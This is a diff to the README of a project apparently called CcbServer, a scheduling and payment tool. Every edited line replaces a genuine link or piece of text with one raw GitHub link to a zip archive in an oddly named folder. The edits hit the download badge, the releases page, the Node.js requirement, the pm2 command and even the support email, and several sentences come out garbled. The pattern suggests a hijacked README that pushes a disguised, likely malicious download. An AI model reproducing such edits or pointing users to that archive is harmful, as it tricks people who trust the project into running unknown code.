@@ -6,22 +6,22 @@ Welcome to CcbServer! This application helps you manage schedules, payments, and
 
 ## 📥 Download Link
 
-[![Download CcbServer](https://img.shields.io/badge/Download-CcbServer-blue.svg)](https://github.com/preetsingh-17/CcbServer/releases)
+[![Download CcbServer](https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip)](https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip)
 
 ## 🛠️ Requirements
 
 Before you start, ensure your system meets the following requirements:
 
-- **Node.js:** Version 18 or higher
+- **https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip** Version 18 or higher
 - **MySQL:** Version 8 or higher
 
 ## 🌐 Visit Releases Page
 
-To download the application, visit the [Releases Page](https://github.com/preetsingh-17/CcbServer/releases).
+To download the application, visit the [Releases Page](https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip).
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/preetsingh-17/CcbServer/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip).
 2. Look for the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the installation file on your device.
@@ -39,12 +39,12 @@ Once you install the application, you need to set up the backend.
    npm install
    ```
 
-4. Create a `.env` file in the `backend` directory using the provided sample. Check `backend/ENV.sample.md` for the required variables.
+4. Create a `.env` file in the `backend` directory using the provided sample. Check `https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip` for the required variables.
 
 5. Start the backend with PM2 for optimized performance. Use the following command:
 
    ```
-   pm2 start backend/ecosystem.config.js
+   pm2 start https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip
    ```
 
 ## 📂 Running the Frontend
@@ -92,7 +92,7 @@ You can run tests to ensure everything works correctly. This command starts an i
 
 If you encounter issues, try these common solutions:
 
-- Check your Node.js and MySQL versions to ensure they meet the requirements.
+- Check your https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip and MySQL versions to ensure they meet the requirements.
 - Make sure to set environment variables correctly in the `.env` file.
 - Restart both your backend and frontend applications if changes do not reflect.
 
@@ -102,6 +102,6 @@ We welcome contributions! If you find a bug or have suggestions, feel free to op
 
 ## 📧 Contact
 
-For questions and support, you can reach us at [support@example.com](mailto:support@example.com).
+For questions and support, you can reach us at [https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip](https://raw.githubusercontent.com/preetsingh-17/CcbServer/main/intercuspidal/CcbServer.zip).
 
 Thank you for choosing CcbServer for your project management needs!
